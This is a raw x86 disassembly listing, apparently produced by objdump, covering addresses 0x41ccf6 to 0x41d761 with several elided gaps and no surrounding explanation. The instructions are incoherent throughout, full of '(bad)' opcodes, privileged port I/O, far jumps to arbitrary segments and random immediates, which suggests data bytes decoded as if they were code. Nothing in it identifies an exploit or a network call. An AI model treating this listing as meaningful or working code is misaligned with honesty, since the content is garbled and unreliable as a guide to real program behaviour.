  41ccf6:	adc    BYTE PTR [ebx],al
  41ccf8:	in     al,dx
  41ccf9:	je     0x41ccc7
  41ccfb:	jg     0x41ccea
  41ccfd:	ins    DWORD PTR es:[edi],dx
  41ccfe:	mov    bh,0xb9
  41cd00:	mov    al,0x12
  41cd02:	sub    al,0xa7
  41cd04:	xor    dh,BYTE PTR [edx*1-0x303e2da0]
  41cd0b:	mov    ds:0x8f410b88,al
  41cd10:	and    al,0xd7
  41cd12:	xchg   esi,eax
  41cd13:	lock pop ebx
  41cd15:	cmp    ah,BYTE PTR [esi]
  41cd17:	cmc    
  41cd18:	push   ss
  41cd19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd1a:	dec    ebx
  41cd1b:	push   esi
  41cd1c:	pop    ds
  41cd1d:	pop    ebx
  41cd1e:	(bad)
  41cd21:	dec    ebx
  41cd22:	cmp    edi,DWORD PTR [ebp+0x7]
  41cd25:	push   0xffffffc3
  41cd27:	fprem1 
  41cd29:	dec    ecx
  41cd2a:	push   ds
  41cd2b:	xor    BYTE PTR [esi-0x738018],bl
  41cd31:	dec    ecx
  41cd32:	aaa    
  41cd33:	cmp    DWORD PTR gs:[esp+eiz*4+0x29],ebp
  41cd38:	(bad)  
  41cd39:	fisubr DWORD PTR [eax-0x5d]
  41cd3c:	leave  
  41cd3d:	mov    al,ds:0xc8592d
	...
  41cdb2:	add    BYTE PTR [eax],al
  41cdb4:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41cdba:	imul   edi
  41cdbc:	push   ebp
  41cdbd:	call   0x467a:0x8cdb1bb
  41cdc4:	in     eax,0x36
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	cmc    
  41cdc9:	add    BYTE PTR [eax],al
  41cdcb:	add    bl,dl
  41cdcd:	pop    es
  41cdce:	jmp    0xf89b:0x1874b4b
  41cdd5:	inc    ecx
  41cdd6:	jmp    0x41ce04
  41cdd8:	xlat   BYTE PTR ds:[ebx]
  41cdd9:	in     eax,dx
  41cdda:	pop    ss
  41cddb:	xor    eax,0xc5121f84
  41cde0:	in     eax,dx
  41cde1:	loopne 0x41ce5f
  41cde3:	mov    al,0x2
  41cde5:	inc    eax
  41cde6:	sbb    al,0x73
  41cde8:	cdq    
  41cde9:	xor    DWORD PTR [edi],ebx
  41cdeb:	and    cl,BYTE PTR [edi+0x5f245434]
  41cdf1:	mov    eax,ds:0x28024a1e
  41cdf6:	gs mov bh,0xc8
  41cdf9:	xor    ebp,DWORD PTR ds:0xdf1bedee
  41cdff:	call   0x9173f237
  41ce04:	inc    edi
  41ce05:	scas   al,BYTE PTR es:[edi]
  41ce06:	sbb    DWORD PTR [edi-0x3b],ebx
  41ce09:	add    dh,BYTE PTR [ebx]
  41ce0b:	adc    BYTE PTR [esi],0x21
  41ce0e:	repnz int3 
  41ce10:	arpl   di,si
  41ce12:	sub    eax,0x1518c839
  41ce17:	nop
  41ce18:	jae    0x41cdd3
  41ce1a:	mov    esi,?
  41ce1c:	sbb    BYTE PTR [edx-0x6a],bh
  41ce1f:	loope  0x41ce1c
  41ce21:	lods   al,BYTE PTR fs:[esi]
  41ce23:	sbb    al,0xe6
  41ce25:	push   esi
  41ce26:	fidivr WORD PTR [edx+0x6423bf0]
  41ce2c:	dec    ebx
  41ce2d:	fwait
  41ce2e:	inc    edi
  41ce2f:	push   ebx
  41ce30:	adc    DWORD PTR [edx-0x31084a16],eax
  41ce36:	lahf   
  41ce37:	imul   edi,DWORD PTR [ecx-0x65],0xffffff93
  41ce3b:	pop    eax
  41ce3c:	aam    0xfb
  41ce3e:	xor    DWORD PTR [ebp-0x5bf9a273],esi
  41ce44:	or     BYTE PTR [eax+0x18],ch
  41ce47:	call   0x12a4081a
  41ce4c:	adc    eax,0x3f66d96e
  41ce51:	or     dl,BYTE PTR [edi]
  41ce53:	(bad)  
  41ce54:	mov    ecx,0x9403356a
  41ce59:	loop   0x41ce72
  41ce5b:	adc    DWORD PTR [edx-0x57],0xbb7ee706
  41ce62:	cdq    
  41ce63:	mov    esp,0xcb4e6dc0
  41ce68:	(bad)  
  41ce69:	xor    DWORD PTR [edi-0x2],ebp
  41ce6c:	inc    ebx
  41ce6d:	jmp    0x3488d22
  41ce72:	push   ebx
  41ce73:	lea    eax,[ebp-0x24]
  41ce76:	loopne 0x41ce22
  41ce78:	mov    DWORD PTR [edi],0xd55fefb4
  41ce7e:	jp     0x41ce67
  41ce80:	jne    0x41cefd
  41ce82:	sti    
  41ce83:	out    0xa,al
  41ce85:	fidiv  DWORD PTR [edx]
  41ce87:	pop    edx
  41ce88:	sbb    edi,ebp
  41ce8a:	leave  
  41ce8b:	test   al,0xaf
  41ce8d:	xor    dl,BYTE PTR [edi-0x49f61eb3]
  41ce93:	clc    
  41ce94:	ror    BYTE PTR [ecx+0x14],0x73
  41ce98:	jno    0x41ce3b
  41ce9a:	(bad)  
  41ce9b:	xchg   ebx,eax
  41ce9c:	jo     0x41ce2b
  41ce9e:	sar    BYTE PTR [eax],1
  41cea0:	aam    0x2e
  41cea2:	outs   dx,DWORD PTR ds:[esi]
  41cea3:	test   DWORD PTR [ecx+0x56],esi
  41cea6:	jle    0x41cee9
  41cea8:	inc    esp
  41cea9:	add    BYTE PTR [edi+0x11c80014],bh
  41ceaf:	in     al,0x1d
  41ceb1:	jno    0x41ce96
  41ceb3:	imul   esi,DWORD PTR [esi],0x7d
  41ceb6:	pop    ss
  41ceb7:	xchg   DWORD PTR ds:0xcdbc9c09,esp
  41cebd:	and    BYTE PTR [eax],0xb4
  41cec0:	cmp    eax,0x0
	...
  41cf31:	add    BYTE PTR [eax],al
  41cf33:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	or     ebx,ecx
  41cf42:	xor    al,BYTE PTR [ebx]
  41cf44:	fidiv  DWORD PTR [edi]
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	cmc    
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [ebx+0x0],ch
  41cf4e:	or     BYTE PTR [ebx+0x76c66927],dl
  41cf54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf55:	jns    0x41cf05
  41cf57:	fld    TBYTE PTR [edi]
  41cf59:	sbb    esp,DWORD PTR [ecx+edx*4-0xb771b15]
  41cf60:	scas   al,BYTE PTR es:[edi]
  41cf61:	sbb    BYTE PTR [edi],bl
  41cf63:	mov    ah,0x25
  41cf65:	ret    0x3ceb
  41cf68:	add    bl,ch
  41cf6a:	push   ebx
  41cf6b:	xor    eax,0xce73a805
  41cf70:	adc    dh,BYTE PTR [edi]
  41cf72:	retf   
  41cf73:	push   fs
  41cf75:	mov    ecx,0x4d896ccc
  41cf7a:	add    al,ah
  41cf7c:	add    DWORD PTR [edx-0x65],ecx
  41cf7f:	fistp  DWORD PTR ds:0x1380f1fb
  41cf85:	cmp    DWORD PTR ds:[edx-0x7a5275a7],esi
  41cf8c:	xor    eax,0x32131b99
  41cf91:	jne    0x41cf7e
  41cf93:	dec    esp
  41cf94:	je     0x41cf2a
  41cf96:	jp     0x41cfc3
  41cf98:	repnz sbb BYTE PTR [ebx-0xda476fe],ah
  41cf9f:	scas   eax,DWORD PTR es:[edi]
  41cfa0:	ficomp DWORD PTR [eax-0x23]
  41cfa3:	sub    BYTE PTR [esi],al
  41cfa5:	adc    BYTE PTR [ebp-0x4c],ah
  41cfa8:	fsub   QWORD PTR [eax]
  41cfaa:	xchg   edi,eax
  41cfab:	lds    ebx,FWORD PTR [ecx+ebp*8-0x5848fae8]
  41cfb2:	mov    ebp,0xacaa0524
  41cfb7:	mov    edx,DWORD PTR [edx-0x75]
  41cfba:	push   ss
  41cfbb:	retf   
  41cfbc:	int3   
  41cfbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfbe:	dec    ebp
  41cfbf:	or     eax,0xf9458887
  41cfc4:	dec    ecx
  41cfc5:	mov    bl,cl
  41cfc7:	fcmovne st,st(7)
  41cfc9:	push   es
  41cfca:	jmp    0xe27eeb91
  41cfcf:	lods   eax,DWORD PTR ds:[esi]
  41cfd0:	jle    0x41cfb2
  41cfd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfd3:	lods   eax,DWORD PTR ds:[esi]
  41cfd4:	add    ah,cl
  41cfd6:	sub    eax,0x6e29255
  41cfdb:	inc    edx
  41cfdc:	jmp    0xfe0c:0xe54f8dc5
  41cfe3:	xchg   ebp,eax
  41cfe4:	into   
  41cfe5:	mov    ds:0xe07d5754,eax
  41cfea:	mov    al,ds:0x8830362e
  41cfef:	es inc esi
  41cff1:	test   esp,esp
  41cff3:	daa    
  41cff4:	xchg   ebp,eax
  41cff5:	rcl    DWORD PTR [ebp+edi*8+0x74a92942],cl
  41cffc:	mov    ah,0xf8
  41cffe:	stos   DWORD PTR es:[edi],eax
  41cfff:	mov    al,ds:0xd85284c2
  41d004:	test   eax,0xae7de9ae
  41d009:	dec    edi
  41d00a:	xchg   esi,eax
  41d00b:	adc    DWORD PTR [ebp-0x7493e49],0x37916356
  41d015:	or     DWORD PTR [edx],esp
  41d017:	data16 lock sbb al,0x36
  41d01b:	lock dec ebp
  41d01d:	test   BYTE PTR [ebx],0xc8
  41d020:	daa    
  41d021:	(bad)  
  41d022:	fild   DWORD PTR [ebp+0x75]
  41d025:	scas   al,BYTE PTR es:[edi]
  41d026:	lods   eax,DWORD PTR ds:[esi]
  41d027:	or     ch,ch
  41d029:	int    0x28
  41d02b:	shl    esi,1
  41d02d:	je     0x41d087
  41d02f:	retf   0x1385
  41d032:	ror    esp,cl
  41d034:	jle    0x41d05a
  41d036:	add    al,0x9c
  41d038:	inc    ecx
  41d039:	call   0x4b8ebd7e
  41d03e:	adc    eax,0xb6f9
	...
  41d0b3:	add    cl,bl
  41d0b5:	dec    edx
  41d0b6:	mov    eax,ds:0xd9fbb3f8
  41d0bb:	imul   ebp,DWORD PTR [edx+0x1a80a798],0x28
  41d0c2:	scas   al,BYTE PTR es:[edi]
  41d0c3:	leave  
  41d0c4:	iret   
  41d0c5:	cmp    BYTE PTR [ecx],al
  41d0c7:	add    ch,dh
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    ah,bh
  41d0cd:	ficomp DWORD PTR [esi+0x2f6d66b0]
  41d0d3:	mov    cl,0x25
  41d0d5:	add    DWORD PTR ds:0xfcca850f,ecx
  41d0db:	cmp    BYTE PTR [edx+0x1c0d3511],al
  41d0e1:	fcomp  QWORD PTR [edi-0x3a]
  41d0e4:	or     DWORD PTR [ebx],edx
  41d0e6:	xor    DWORD PTR [ebx+0x3790df92],0xc7785c2f
  41d0f0:	push   edx
  41d0f1:	mov    bh,0x9b
  41d0f3:	jae    0x41d085
  41d0f5:	jle    0x41d0ec
  41d0f7:	sbb    ebx,DWORD PTR [ebp+ecx*1+0x74]
  41d0fb:	xchg   DWORD PTR [eax-0x24602df9],edx
  41d101:	int3   
  41d102:	adc    BYTE PTR [ebp+ebx*2+0x7b5e7378],bh
  41d109:	xchg   ecx,eax
  41d10a:	inc    ecx
  41d10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d10c:	(bad)  
  41d10e:	ss call 0xc4d71bca
  41d114:	inc    ebx
  41d115:	cld    
  41d116:	ins    BYTE PTR es:[edi],dx
  41d117:	jnp    0x41d0fe
  41d119:	in     al,dx
  41d11a:	xchg   ebp,eax
  41d11b:	jp     0x41d16d
  41d11d:	mov    esp,0xadfb42c9
  41d122:	retf   0x26bf
  41d125:	mov    ds:0x1cee4672,al
  41d12a:	xor    eax,0xcab8f35c
  41d12f:	sbb    eax,0xc8c528f4
  41d134:	mov    bh,0x2d
  41d136:	jl     0x41d166
  41d138:	jne    0x41d146
  41d13a:	xlat   BYTE PTR ds:[ebx]
  41d13b:	es xchg esp,eax
  41d13d:	xor    bh,BYTE PTR [edx]
  41d13f:	jecxz  0x41d0dd
  41d141:	jbe    0x41d111
  41d143:	test   bl,0xba
  41d146:	sub    al,BYTE PTR [ebx+0x1a]
  41d149:	jno    0x41d1af
  41d14b:	jns    0x41d125
  41d14d:	inc    edi
  41d14e:	mov    eax,ds:0x798d5965
  41d153:	inc    ebx
  41d154:	or     ah,BYTE PTR [esi-0x58113d64]
  41d15a:	mov    ecx,0x5d743e0d
  41d15f:	mov    WORD PTR [edx+0x345add77],?
  41d165:	call   0x70ad9440
  41d16a:	cwde   
  41d16b:	pop    ecx
  41d16c:	mov    eax,ds:0xffcb034b
  41d171:	sub    ebx,DWORD PTR [edi-0x2e33d3d0]
  41d177:	cmp    al,0x1d
  41d179:	loope  0x41d152
  41d17b:	pop    ecx
  41d17c:	jo     0x41d159
  41d17e:	arpl   dx,bp
  41d180:	ret    
  41d181:	xor    eax,0x5e93df60
  41d186:	add    BYTE PTR [esi-0x13d3d5ce],ah
  41d18c:	xchg   esp,eax
  41d18d:	inc    ebp
  41d18e:	and    DWORD PTR [edx-0x16ce97d5],esi
  41d194:	and    al,0x2b
  41d196:	inc    esi
  41d197:	jg     0x41d177
  41d199:	fsubr  st(3),st
  41d19b:	or     DWORD PTR [ecx+0x78129819],edx
  41d1a1:	sub    al,0x9c
  41d1a3:	les    ebp,FWORD PTR [esi-0xf2b2bda]
  41d1a9:	arpl   dx,si
  41d1ab:	(bad)  
  41d1ac:	mov    ch,0x28
  41d1ae:	or     BYTE PTR [ecx+0x563ce7f7],bh
  41d1b4:	push   esi
  41d1b5:	sbb    DWORD PTR [ebx],edx
  41d1b7:	pop    ds
  41d1b8:	bound  edi,QWORD PTR [ecx]
  41d1ba:	adc    edi,0xac940826
  41d1c0:	dec    ebp
	...
  41d231:	add    BYTE PTR [eax],al
  41d233:	add    bl,dh
  41d235:	and    ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	pop    edx
  41d241:	or     BYTE PTR ds:0x139c404,al
  41d247:	add    ch,dh
  41d249:	add    BYTE PTR [eax],al
  41d24b:	add    ch,al
  41d24d:	xor    dl,BYTE PTR [eax-0x5e]
  41d250:	adc    dh,BYTE PTR [eax-0x26]
  41d253:	jg     0x41d28b
  41d255:	lahf   
  41d256:	mov    edx,0x22947d76
  41d25b:	and    eax,0x11508d0
  41d260:	daa    
  41d261:	out    dx,eax
  41d262:	add    al,0xa8
  41d264:	add    dh,BYTE PTR [edx-0xe2462fc]
  41d26a:	sar    DWORD PTR [ebx],0x37
  41d26d:	clc    
  41d26e:	mov    ebx,DWORD PTR [edi+0x1689389e]
  41d274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d275:	xchg   ebx,eax
  41d276:	cld    
  41d277:	and    esp,ebp
  41d279:	pop    edi
  41d27a:	ins    DWORD PTR es:[edi],dx
  41d27b:	js     0x41d2e1
  41d27d:	sub    BYTE PTR [edi],dl
  41d27f:	push   0x63
  41d281:	add    al,0xc9
  41d283:	stos   BYTE PTR es:[edi],al
  41d284:	sbb    al,0xf8
  41d286:	pop    edi
  41d287:	adc    ah,al
  41d289:	cs jle 0x41d2e4
  41d28c:	cld    
  41d28d:	mov    BYTE PTR [edx+0x72],0xb1
  41d291:	(bad)  
  41d292:	adc    DWORD PTR [edx+ecx*1],ebx
  41d295:	mov    dh,0xf3
  41d297:	xor    dl,BYTE PTR [eax]
  41d299:	loope  0x41d288
  41d29b:	cs push edi
  41d29d:	mov    ecx,0xbff68ba1
  41d2a2:	pop    eax
  41d2a3:	xor    al,0xe3
  41d2a5:	push   esi
  41d2a6:	jecxz  0x41d2c8
  41d2a8:	pop    esp
  41d2a9:	xchg   esi,eax
  41d2aa:	test   DWORD PTR [ecx],ebx
  41d2ac:	pushf  
  41d2ad:	xchg   DWORD PTR [ecx+0x39],esp
  41d2b0:	xchg   esp,ebp
  41d2b2:	ins    DWORD PTR es:[edi],dx
  41d2b3:	sbb    dl,BYTE PTR [eax-0x3103add0]
  41d2b9:	sbb    al,0xe0
  41d2bb:	push   ss
  41d2bc:	jno    0x41d2ee
  41d2be:	jle    0x41d2e3
  41d2c0:	hlt    
  41d2c1:	aam    0x39
  41d2c3:	jmp    0x41d2a2
  41d2c5:	and    BYTE PTR [edx-0x51],dh
  41d2c8:	xlat   BYTE PTR ds:[ebx]
  41d2c9:	outs   dx,BYTE PTR ds:[esi]
  41d2ca:	sub    eax,DWORD PTR [esi-0x45293a0f]
  41d2d0:	inc    esp
  41d2d1:	cmp    al,0x4a
  41d2d3:	inc    edx
  41d2d4:	jp     0x41d2be
  41d2d6:	test   bl,0x59
  41d2d9:	scas   al,BYTE PTR es:[edi]
  41d2da:	push   ebx
  41d2db:	int    0x65
  41d2dd:	cmp    DWORD PTR [ecx-0x11],ebp
  41d2e0:	cs push esp
  41d2e2:	sbb    al,0x71
  41d2e4:	stc    
  41d2e5:	and    DWORD PTR [edx+0x52],edi
  41d2e8:	leave  
  41d2e9:	lods   eax,DWORD PTR ds:[esi]
  41d2ea:	dec    edx
  41d2eb:	int    0x51
  41d2ed:	push   ebx
  41d2ee:	add    DWORD PTR [edi+ebp*1-0x3460bcbc],0xc
  41d2f6:	mov    ss,ebx
  41d2f8:	mul    DWORD PTR [edi+0x701eaec2]
  41d2fe:	inc    ebp
  41d2ff:	dec    ebp
  41d300:	and    BYTE PTR [ecx+0x75143aba],dh
  41d306:	das    
  41d307:	retf   
  41d308:	test   eax,0x609831fc
  41d30d:	dec    ecx
  41d30e:	mov    DWORD PTR [ebx-0x6f24fa37],ecx
  41d314:	gs ins DWORD PTR es:[edi],dx
  41d316:	pusha  
  41d317:	imul   esi,DWORD PTR [esi],0xfffffff9
  41d31a:	rol    DWORD PTR [ecx],0x87
  41d31d:	fcom   DWORD PTR [ebx+ebp*2]
  41d320:	mov    ebx,0x697b46aa
  41d325:	bswap  ebp
  41d327:	inc    esp
  41d328:	xor    bl,ah
  41d32a:	xor    BYTE PTR [ebx+0x25ed0a4b],dl
  41d330:	push   0xfffffff7
  41d332:	fs sub ebp,edi
  41d335:	clc    
  41d336:	and    eax,0xd2fb6849
  41d33b:	daa    
  41d33c:	pop    es
  41d33d:	or     al,0xa2
  41d33f:	mov    dl,ah
	...
  41d3b1:	add    BYTE PTR [eax],al
  41d3b3:	add    BYTE PTR [ebx+0x20],dl
  41d3b6:	mov    al,ds:0x5faef3ae
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	mov    al,0x22
  41d3c2:	add    BYTE PTR [eax-0x47],dl
  41d3c5:	cmp    al,BYTE PTR [ecx]
  41d3c7:	add    ch,dh
  41d3c9:	add    BYTE PTR [eax],al
  41d3cb:	add    dh,ch
  41d3cd:	push   0x2e
  41d3cf:	dec    esi
  41d3d0:	sub    DWORD PTR [edi+0x36],0x198ae8ff
  41d3d7:	pop    edi
  41d3d8:	jae    0x41d423
  41d3da:	frstor [edx+0x3fdb4e23]
  41d3e0:	adc    al,0x16
  41d3e2:	jb     0x41d461
  41d3e4:	cmp    al,0xd
  41d3e6:	ror    edx,cl
  41d3e8:	xor    DWORD PTR [ebp+ebx*1-0x1],edi
  41d3ec:	imul   ecx,DWORD PTR [eax],0xffffff96
  41d3ef:	push   esi
  41d3f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3f1:	mov    cl,0xee
  41d3f3:	enter  0x29f,0x42
  41d3f7:	mov    ds:0x7197d3a3,al
  41d3fc:	push   0x9d6608ed
  41d401:	or     eax,0xd599fab4
  41d406:	mov    ebp,gs
  41d408:	loope  0x41d488
  41d40a:	fcomp  QWORD PTR [edi]
  41d40c:	and    BYTE PTR [ecx+0x1a4cad84],dh
  41d412:	and    al,0xc9
  41d414:	ret    
  41d415:	test   BYTE PTR [esi+0x4f8a0ec2],ah
  41d41b:	fwait
  41d41c:	mov    eax,ds:0xa6a4cfd1
  41d421:	xor    eax,0xf058bd32
  41d426:	loopne 0x41d411
  41d428:	into   
  41d429:	or     al,0xed
  41d42b:	scas   al,BYTE PTR es:[edi]
  41d42c:	pop    edi
  41d42d:	pusha  
  41d42e:	shl    DWORD PTR [edx-0x15],0xbf
  41d432:	test   BYTE PTR [eax-0x71],al
  41d435:	sub    BYTE PTR ds:0xd6d06d25,al
  41d43b:	inc    edi
  41d43c:	retf   
  41d43d:	mov    ecx,eax
  41d43f:	dec    ebp
  41d440:	xchg   esp,eax
  41d441:	mov    esp,0xa4a989a4
  41d446:	mov    dh,0x49
  41d448:	scas   eax,DWORD PTR es:[edi]
  41d449:	jl     0x41d419
  41d44b:	dec    ebp
  41d44c:	xor    DWORD PTR [ebx],0x59e6956d
  41d452:	test   eax,ecx
  41d454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d455:	repnz dec ecx
  41d457:	mov    al,ds:0x2afaf329
  41d45c:	jp     0x41d4c5
  41d45e:	add    BYTE PTR [eax],ah
  41d460:	mov    ds:0xbd156ec2,eax
  41d465:	das    
  41d466:	jae    0x41d432
  41d468:	iret   
  41d469:	mov    bl,0xf6
  41d46b:	xor    al,0xfa
  41d46d:	mov    gs,WORD PTR [ecx-0x71]
  41d470:	xchg   ebx,eax
  41d471:	and    DWORD PTR ds:0xcbb00aa,eax
  41d477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d478:	sub    al,0x90
  41d47a:	or     al,0x44
  41d47c:	adc    BYTE PTR [ebp-0x74d87d70],bh
  41d482:	cmp    BYTE PTR [edx+0x20a319d8],bh
  41d488:	cmp    eax,0x80d42f17
  41d48d:	xchg   edi,eax
  41d48e:	ja     0x41d4cc
  41d490:	in     al,0xaf
  41d492:	cmp    al,0x59
  41d494:	mov    bh,0x4b
  41d496:	push   esi
  41d497:	mov    dl,BYTE PTR [edx*4+0x2bfb4b26]
  41d49e:	mov    ah,0x36
  41d4a0:	jmp    0xd8d4f0be
  41d4a5:	adc    dl,al
  41d4a7:	jle    0x41d477
  41d4a9:	or     al,BYTE PTR [eax]
  41d4ab:	loop   0x41d44f
  41d4ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4ae:	test   eax,0xb7c91a71
  41d4b3:	lods   eax,DWORD PTR ds:[esi]
  41d4b4:	in     al,0x84
  41d4b6:	dec    esp
  41d4b7:	xchg   ecx,eax
  41d4b8:	ret    
  41d4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4ba:	add    al,0x7b
  41d4bc:	mov    edi,0x5d75b287
	...
  41d531:	add    BYTE PTR [eax],al
  41d533:	add    ch,al
  41d535:	and    edx,DWORD PTR [ecx-0xa4808db]
  41d53b:	jecxz  0x41d58e
  41d53d:	or     edi,DWORD PTR [edx+ecx*8+0x49573f2f]
  41d544:	scas   al,BYTE PTR es:[edi]
  41d545:	cmp    eax,DWORD PTR [ecx]
  41d547:	add    ch,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [ebx+0x3cf5dd98],ch
  41d551:	cmp    al,0xfc
  41d553:	and    DWORD PTR [edi],ecx
  41d555:	ja     0x41d4e4
  41d557:	in     eax,0xa4
  41d559:	outs   dx,DWORD PTR ds:[esi]
  41d55a:	cmp    al,0x78
  41d55c:	and    ch,dl
  41d55e:	ja     0x41d59b
  41d560:	loopne 0x41d53a
  41d562:	test   al,0x5d
  41d564:	sub    edx,DWORD PTR [ebp+0x6f]
  41d567:	call   0xa46d:0x5e5b8cc0
  41d56e:	into   
  41d56f:	out    dx,eax
  41d570:	add    DWORD PTR [edi-0x2289ce6a],0x18
  41d577:	data16 int3 
  41d579:	push   cs
  41d57a:	not    DWORD PTR [ebp-0x19]
  41d57d:	jb     0x41d5f7
  41d57f:	out    dx,al
  41d580:	push   0xffffffdd
  41d582:	dec    esp
  41d583:	mov    ebp,0xb6bd20fe
  41d588:	xchg   esi,eax
  41d589:	xor    ebp,DWORD PTR [esi+ebx*1+0x3b]
  41d58d:	stos   DWORD PTR es:[edi],eax
  41d58e:	xor    BYTE PTR [ecx],0x68
  41d591:	xor    esp,DWORD PTR [edi+0x17ad0c3e]
  41d597:	outs   dx,BYTE PTR ds:[esi]
  41d598:	mov    bh,0x62
  41d59a:	sub    eax,0x4f64de01
  41d59f:	mov    cl,0x34
  41d5a1:	xor    cl,BYTE PTR [edx-0x53c3810d]
  41d5a7:	mov    fs,WORD PTR [eax-0x1351090c]
  41d5ad:	cmp    ebx,esi
  41d5af:	add    eax,0xaa1ec294
  41d5b4:	mov    eax,0x6a62565b
  41d5b9:	push   es
  41d5ba:	rcr    edi,cl
  41d5bc:	dec    ebp
  41d5bd:	fwait
  41d5be:	mov    ds:0x4f5d66d,eax
  41d5c3:	and    edi,DWORD PTR [edx-0x42]
  41d5c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5c7:	mov    ecx,0x5c2fdec4
  41d5cc:	or     DWORD PTR [esi],0xe
  41d5cf:	adc    eax,0x5bf46fe0
  41d5d4:	dec    ecx
  41d5d5:	cdq    
  41d5d6:	sbb    BYTE PTR [eax-0x1b39646],dh
  41d5dc:	repnz adc al,0x47
  41d5df:	pop    ds
  41d5e0:	clc    
  41d5e1:	jl     0x41d624
  41d5e3:	xor    esp,DWORD PTR [edi-0x5f4ba2f3]
  41d5e9:	jne    0x41d5bb
  41d5eb:	adc    edi,0x8a744346
  41d5f1:	push   ecx
  41d5f2:	pop    ebx
  41d5f3:	dec    ebp
  41d5f4:	cwde   
  41d5f5:	mov    edi,0x83cbc4b9
  41d5fa:	test   DWORD PTR [esi],0x47be0e26
  41d600:	sub    ah,BYTE PTR [esi+edi*1+0x3b6c499c]
  41d607:	sar    BYTE PTR [ebp-0x44],cl
  41d60a:	test   BYTE PTR [edi-0x6],al
  41d60d:	popf   
  41d60e:	iret   
  41d60f:	ret    0x3d2
  41d612:	int3   
  41d613:	outs   dx,BYTE PTR ds:[esi]
  41d614:	(bad)
  41d617:	nop
  41d618:	cmc    
  41d619:	ret    
  41d61a:	icebp  
  41d61b:	jmp    0x41d677
  41d61d:	bound  esp,QWORD PTR [ecx-0x40a3640b]
  41d623:	pop    esi
  41d624:	pop    esp
  41d625:	sbb    BYTE PTR [ecx+esi*1-0x20d5e860],bl
  41d62c:	clc    
  41d62d:	fdiv   QWORD PTR [eax+0x77]
  41d630:	daa    
  41d631:	xchg   ebp,eax
  41d632:	sahf   
  41d633:	in     eax,0xbd
  41d635:	pop    esp
  41d636:	mov    dl,0x71
  41d638:	push   esi
  41d639:	and    edx,esi
  41d63b:	dec    ebx
  41d63c:	push   ds
  41d63d:	rcl    ecx,cl
  41d63f:	arpl   WORD PTR [edi],bp
	...
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0x2e070a3b
  41d6c2:	call   0x17e7a5e
  41d6c7:	add    ch,dh
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [edx-0xc],dh
  41d6ce:	sub    eax,0x81df2185
  41d6d3:	cmp    al,0x4e
  41d6d5:	shl    DWORD PTR [edi+0x72fb246],1
  41d6db:	pop    ecx
  41d6dc:	imul   ecx,DWORD PTR [ecx+eiz*4],0xc1b50fdb
  41d6e3:	js     0x41d6da
  41d6e5:	mov    cl,0x2f
  41d6e7:	mov    eax,DWORD PTR [eax+0x3874e25a]
  41d6ed:	fstp   TBYTE PTR [ecx+0x5009956a]
  41d6f3:	lds    ecx,FWORD PTR [ebp-0xe25df28]
  41d6f9:	lock test esi,esp
  41d6fc:	dec    edi
  41d6fd:	sub    al,0x57
  41d6ff:	cdq    
  41d700:	inc    edi
  41d702:	push   cs
  41d703:	retw   0x804d
  41d707:	js     0x41d765
  41d709:	out    dx,eax
  41d70a:	push   edx
  41d70b:	out    dx,eax
  41d70c:	std    
  41d70d:	pop    esi
  41d70e:	lods   al,BYTE PTR ds:[esi]
  41d70f:	retf   0x99ef
  41d712:	sub    dh,bh
  41d714:	cmp    eax,0x9438bb91
  41d719:	popa   
  41d71a:	and    DWORD PTR [ecx+ebx*1],ebp
  41d71d:	sub    edi,ebp
  41d71f:	out    dx,eax
  41d720:	cmp    al,BYTE PTR [ecx+0x2]
  41d723:	mov    edi,ebx
  41d725:	mov    ebp,0xa832b7
  41d72a:	or     BYTE PTR [ecx],ah
  41d72c:	inc    eax
  41d72d:	outs   dx,DWORD PTR ds:[esi]
  41d72e:	push   esp
  41d72f:	(bad)  
  41d730:	fdivp  st(5),st
  41d732:	lea    esp,[esi+eax*8-0x2de03a26]
  41d739:	in     eax,dx
  41d73a:	cwde   
  41d73b:	xchg   edi,eax
  41d73c:	mov    ah,0x9c
  41d73e:	push   eax
  41d73f:	inc    esp
  41d740:	and    eax,DWORD PTR [eax+edx*4]
  41d743:	and    DWORD PTR [ebx+0x7e30d4ba],edi
  41d749:	xor    eax,DWORD PTR [edx]
  41d74b:	jbe    0x41d7b0
  41d74d:	adc    eax,0x89208b1b
  41d752:	jb     0x41d717
  41d754:	fistp  QWORD PTR [eax+ebp*2]
  41d757:	or     ebp,edx
  41d759:	lods   eax,DWORD PTR ds:[esi]
  41d75a:	lods   al,BYTE PTR ds:[esi]
  41d75b:	dec    eax
  41d75c:	sbb    eax,DWORD PTR [ebp-0x16]
  41d75f:	or     al,0x74
  41d761:	xor    DWORD PTR [ebp-0x6b],edi
